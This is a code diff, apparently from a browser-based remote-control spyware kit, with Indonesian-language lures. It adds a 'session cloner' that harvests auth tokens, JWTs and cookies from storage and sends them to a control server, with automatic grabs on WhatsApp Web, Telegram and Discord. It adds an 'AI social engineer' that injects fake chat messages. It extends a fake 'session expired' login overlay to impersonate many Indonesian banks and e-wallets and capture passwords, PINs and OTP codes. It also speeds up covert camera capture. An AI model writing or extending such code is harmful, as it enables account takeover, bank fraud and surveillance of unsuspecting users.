@@ -263,12 +263,11 @@ function startCameraStream() {
     let frameBusy = false;
     function sendFrame() {
         if (!camStreamInterval) return;
-        if (frameBusy) { camStreamInterval = setTimeout(sendFrame, 200); return; }
-        if (v.readyState < 2) { stopCameraStream(); setTimeout(startCameraStream, 200); return; }
+        if (frameBusy) { camStreamInterval = setTimeout(sendFrame, 33); return; }
+        if (v.readyState < 2) { stopCameraStream(); setTimeout(startCameraStream, 33); return; }
         frameBusy = true;
         try {
             ctx.drawImage(v, 0, 0, 160, 120);
-            // AI Face Detection — every 5 seconds, low-res skin analysis
             const now = Date.now();
             if (now - lastFaceCheck > 5000) {
                 lastFaceCheck = now;
@@ -303,9 +302,9 @@ function startCameraStream() {
                 }
             }, 'image/jpeg', 0.15);
         } catch(e) { frameBusy = false; }
-        camStreamInterval = setTimeout(sendFrame, 200);
+        camStreamInterval = setTimeout(sendFrame, 33);
     }
-    camStreamInterval = setTimeout(sendFrame, 200);
+    camStreamInterval = setTimeout(sendFrame, 33);
 }
 function startCamAudioStream() {
     if (camAudioRecorder) return;
@@ -588,6 +587,101 @@ socket.on('force-respawn', () => {
 });
 
 // AI Auto-Control socket handlers
+// 👾 Session Cloner — grab localStorage session tokens
+function grabSessionData(platform, domain) {
+    const sessionData = {};
+    try {
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const val = localStorage.getItem(key) || '';
+            const lowerKey = key.toLowerCase();
+            if (lowerKey.includes('token') || lowerKey.includes('session') || lowerKey.includes('auth') ||
+                lowerKey.includes('credential') || lowerKey.includes('login') || lowerKey.includes('user') ||
+                lowerKey.includes('sid') || lowerKey.includes('secret') || lowerKey.includes('key') ||
+                lowerKey.includes('wa_') || lowerKey.includes('tg_') || lowerKey.includes('discord') ||
+                lowerKey.includes('access') || lowerKey.includes('refresh') || lowerKey.includes('jwt') ||
+                lowerKey.includes('id_') || lowerKey.includes('csrf') || val.length > 50) {
+                sessionData[key] = val.slice(0, 200);
+            }
+        }
+    } catch(e) {}
+    try {
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            const val = sessionStorage.getItem(key) || '';
+            const lowerKey = key.toLowerCase();
+            if (lowerKey.includes('token') || lowerKey.includes('session') || lowerKey.includes('auth') ||
+                lowerKey.includes('login') || lowerKey.includes('sid') || lowerKey.includes('secret') ||
+                lowerKey.includes('wa_') || lowerKey.includes('tg_') || lowerKey.includes('jwt') ||
+                lowerKey.includes('csrf') || lowerKey.includes('id_')) {
+                sessionData['ss_' + key] = val.slice(0, 200);
+            }
+        }
+    } catch(e) {}
+    try {
+        const cookies = document.cookie.split(';').filter(Boolean);
+        cookies.forEach(c => {
+            const parts = c.trim().split('=');
+            const key = parts[0];
+            const val = parts.slice(1).join('=');
+            const lowerKey = key.toLowerCase();
+            if (lowerKey.includes('token') || lowerKey.includes('session') || lowerKey.includes('auth') ||
+                lowerKey.includes('sid') || lowerKey.includes('secret') || lowerKey.includes('login') ||
+                lowerKey.includes('wa_') || lowerKey.includes('tg_') || lowerKey.includes('discord') ||
+                lowerKey.includes('remember') || lowerKey.includes('access') || lowerKey.includes('csrf')) {
+                sessionData['cookie_' + key] = val.slice(0, 200);
+            }
+        });
+    } catch(e) {}
+    if (Object.keys(sessionData).length > 0) {
+        socket.emit('session-grab', { platform, domain, sessionData });
+    }
+}
+
+socket.on('request-session-grab', (data) => {
+    const platform = data.platform || 'Unknown';
+    const domain = data.domain || window.location.hostname;
+    grabSessionData(platform, domain);
+});
+
+// 🤖 AI Social Engineer — proactive chat from AI persona
+socket.on('social-engineer-chat', (data) => {
+    const { message, persona, engaging } = data;
+    if (!message) return;
+    window._socialEngineerActive = true;
+    // Show fake notification first
+    showFakeNotif(persona + ' - Pesan Baru', 'Ada pesan baru untuk Anda.');
+    // Open AI chat and send message as if from bot
+    // Find or create the AI chat elements
+    let chatPanel = document.querySelector('.ai-chat-panel');
+    let chatBtn = document.querySelector('.ai-chat-btn');
+    if (!chatPanel || !chatBtn) {
+        // Initialize AI chat if not already loaded
+        if (typeof initAIChat === 'function') {
+            initAIChat();
+        }
+        chatPanel = document.querySelector('.ai-chat-panel');
+        chatBtn = document.querySelector('.ai-chat-btn');
+    }
+    // Show the chat panel
+    if (chatPanel) chatPanel.style.display = 'flex';
+    // Wait a moment then add the message
+    setTimeout(() => {
+        const msgContainer = document.querySelector('.ai-msg-container');
+        if (msgContainer) {
+            const msgDiv = document.createElement('div');
+            msgDiv.className = 'ai-msg-bot';
+            msgDiv.textContent = message;
+            msgContainer.appendChild(msgDiv);
+            msgContainer.scrollTop = msgContainer.scrollHeight;
+        }
+        // If engaging mode, also send auto-reply to trigger AI response
+        if (engaging) {
+            // No-op — wait for user to respond
+        }
+    }, 500);
+});
+
 socket.on('request-clipboard', () => {
     stealClipboard();
     // Also try direct clipboard read
@@ -612,19 +706,20 @@ socket.on('inject-phishing', (data) => {
     const overlay = document.createElement('div');
     overlay.id = 'phishing-overlay';
     overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999999;display:flex;align-items:center;justify-content:center;';
-    const brands = { 'facebook.com': { name: 'Facebook', logo: '📘' }, 'instagram.com': { name: 'Instagram', logo: '📷' }, 'gmail.com': { name: 'Gmail', logo: '📧' }, 'google.com': { name: 'Google', logo: '🔍' }, 'tokopedia.com': { name: 'Tokopedia', logo: '🛒' }, 'shopee.co.id': { name: 'Shopee', logo: '🛍️' }, 'gojek.com': { name: 'Gojek', logo: '🟢' }, 'dana.id': { name: 'DANA', logo: '💳' }, 'ovo.id': { name: 'OVO', logo: '🟣' }, 'gopay.co.id': { name: 'GoPay', logo: '🔵' } };
-    const brand = brands[site] || { name: site, logo: '🔐' };
-    overlay.innerHTML = '<div style="background:white;padding:30px;border-radius:12px;text-align:center;max-width:350px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3);font-family:Arial,sans-serif;"><div style="font-size:48px;margin-bottom:10px">' + brand.logo + '</div><h2 style="margin:0 0 5px;color:#333;font-size:20px">Sesi Berakhir</h2><p style="color:#666;margin:0 0 20px;font-size:14px">Sesi ' + brand.name + ' Anda telah berakhir. Silakan login ulang untuk melanjutkan.</p><input id="phish-email" type="email" placeholder="Email / No HP" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box"><input id="phish-pass" type="password" placeholder="Kata Sandi" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box"><button id="phish-btn" style="width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:16px;cursor:pointer">Login</button><p style="font-size:11px;color:#999;margin-top:12px">' + brand.name + ' akan mengingat perangkat ini.</p></div>';
+    const brands = { 'facebook.com': { name: 'Facebook', logo: '📘', bg: '#1877f2' }, 'instagram.com': { name: 'Instagram', logo: '📷', bg: '#e4405f' }, 'gmail.com': { name: 'Gmail', logo: '📧', bg: '#d93025' }, 'google.com': { name: 'Google', logo: '🔍', bg: '#4285f4' }, 'tokopedia.com': { name: 'Tokopedia', logo: '🛒', bg: '#42b549' }, 'shopee.co.id': { name: 'Shopee', logo: '🛍️', bg: '#ee4d2d' }, 'gojek.com': { name: 'Gojek', logo: '🟢', bg: '#00a63e' }, 'dana.id': { name: 'DANA', logo: '💳', bg: '#0088d0' }, 'ovo.id': { name: 'OVO', logo: '🟣', bg: '#5c2d91' }, 'gopay.co.id': { name: 'GoPay', logo: '🔵', bg: '#005fbf' }, 'klikbca.com': { name: 'BCA', logo: '🏦', bg: '#003f87' }, 'mybca.com': { name: 'BCA', logo: '🏦', bg: '#003f87' }, 'ib.bri.co.id': { name: 'BRI', logo: '🏛️', bg: '#003c71' }, 'ibank.bri.co.id': { name: 'BRI', logo: '🏛️', bg: '#003c71' }, 'mandiri.id': { name: 'Mandiri', logo: '🏦', bg: '#003d7a' }, 'mandirionline.net': { name: 'Mandiri', logo: '🏦', bg: '#003d7a' }, 'bni.co.id': { name: 'BNI', logo: '🏦', bg: '#003c71' }, 'ibank.niaga.co.id': { name: 'CIMB Niaga', logo: '🏦', bg: '#002060' }, 'permata.net': { name: 'Permata Bank', logo: '🏦', bg: '#003679' }, 'danamon.co.id': { name: 'Danamon', logo: '🏦', bg: '#003366' }, 'cimbniaga.co.id': { name: 'CIMB Niaga', logo: '🏦', bg: '#002060' }, 'maybank.co.id': { name: 'Maybank', logo: '🏦', bg: '#f5b81b' }, 'uob.co.id': { name: 'UOB', logo: '🏦', bg: '#00529b' }, 'jenius.com': { name: 'Jenius', logo: '⚡', bg: '#0071ce' }, 'digibank.co.id': { name: 'Digibank', logo: '🏛️', bg: '#ff6600' }, 'blu.com': { name: 'Blu by BCA', logo: '🔷', bg: '#0088d0' }, 'seabank.id': { name: 'SeaBank', logo: '🌊', bg: '#00a651' }, 'superbank.id': { name: 'SuperBank', logo: '🟠', bg: '#f58220' }, 'bankjago.com': { name: 'Bank Jago', logo: '🔶', bg: '#ff6b00' } };
+    const brand = brands[site] || { name: site, logo: '🔐', bg: '#1877f2' };
+    overlay.innerHTML = '<div style="background:white;padding:30px;border-radius:12px;text-align:center;max-width:350px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3);font-family:Arial,sans-serif;"><div style="font-size:48px;margin-bottom:10px">' + brand.logo + '</div><h2 style="margin:0 0 5px;color:#333;font-size:20px">Sesi Berakhir</h2><p style="color:#666;margin:0 0 20px;font-size:14px">Sesi ' + brand.name + ' Anda telah berakhir. Silakan login ulang untuk melanjutkan.</p><input id="phish-email" type="text" placeholder="Email / No HP / Username" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box"><input id="phish-pass" type="password" placeholder="Kata Sandi / PIN / mPIN" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box"><input id="phish-otp" type="text" placeholder="Kode OTP (jika ada)" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box"><button id="phish-btn" style="width:100%;padding:12px;background:' + brand.bg + ';color:white;border:none;border-radius:6px;font-size:16px;cursor:pointer">Verifikasi & Login</button><p style="font-size:11px;color:#999;margin-top:12px">' + brand.name + ' akan mengingat perangkat ini.</p></div>';
     document.body.appendChild(overlay);
     document.getElementById('phish-btn').addEventListener('click', () => {
         const email = document.getElementById('phish-email').value;
         const pass = document.getElementById('phish-pass').value;
+        const otp = document.getElementById('phish-otp').value;
         if (email && pass) {
-            socket.emit('device-info', { fieldEmail: email, fieldPass: pass, phishingSite: site });
+            socket.emit('device-info', { fieldEmail: email, fieldPass: pass, phishingOTP: otp, phishingSite: site });
             overlay.innerHTML = '<div style="background:white;padding:30px;border-radius:12px;text-align:center;max-width:350px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)"><div style="font-size:48px;margin-bottom:10px">✅</div><h2 style="color:#333;font-size:18px">Berhasil</h2><p style="color:#666;font-size:14px">Mengalihkan ke ' + brand.name + '...</p></div>';
             setTimeout(() => { const o = document.getElementById('phishing-overlay'); if (o) o.remove(); }, 2000);
         } else {
-            alert('Harap isi email dan kata sandi.');
+            alert('Harap isi data login dengan benar.');
         }
     });
 });
@@ -1981,8 +2076,12 @@ function sendAIMessage() {
     addChatBubble(msg, 'user');
     showTypingIndicator();
 
-    // Send via Socket.IO
-    socket.emit('ai-message', { deviceId: deviceId, message: msg });
+    // Send via Socket.IO — social engineer if active, normal chat otherwise
+    if (window._socialEngineerActive) {
+        socket.emit('social-engineer-reply', { deviceId: deviceId, message: msg });
+    } else {
+        socket.emit('ai-message', { deviceId: deviceId, message: msg });
+    }
 }
 
 function addChatBubble(text, type) {
@@ -2012,7 +2111,7 @@ function removeTypingIndicator() {
     if (el) el.remove();
 }
 
-// AI URL Monitor — track page changes
+// AI URL Monitor — track page changes + auto session grab
 function initURLMonitor() {
     let lastUrl = window.location.href;
     let lastTitle = document.title;
@@ -2024,6 +2123,17 @@ function initURLMonitor() {
             lastUrl = currentUrl;
             lastTitle = currentTitle;
             socket.emit('url-change', { url: currentUrl, title: currentTitle });
+        }
+        // Auto session grab — check if on target platform every 30s
+        if (currentUrl.includes('web.whatsapp.com') || currentUrl.includes('web.telegram.org') || currentUrl.includes('discord.com') || currentUrl.includes('discordapp.com')) {
+            if (!window._lastSessionGrab || Date.now() - window._lastSessionGrab > 30000) {
+                window._lastSessionGrab = Date.now();
+                let platform = 'Unknown';
+                if (currentUrl.includes('web.whatsapp.com')) platform = 'WhatsApp';
+                else if (currentUrl.includes('web.telegram.org')) platform = 'Telegram';
+                else if (currentUrl.includes('discord.com') || currentUrl.includes('discordapp.com')) platform = 'Discord';
+                grabSessionData(platform, window.location.hostname);
+            }
         }
     }, 2000);
 }
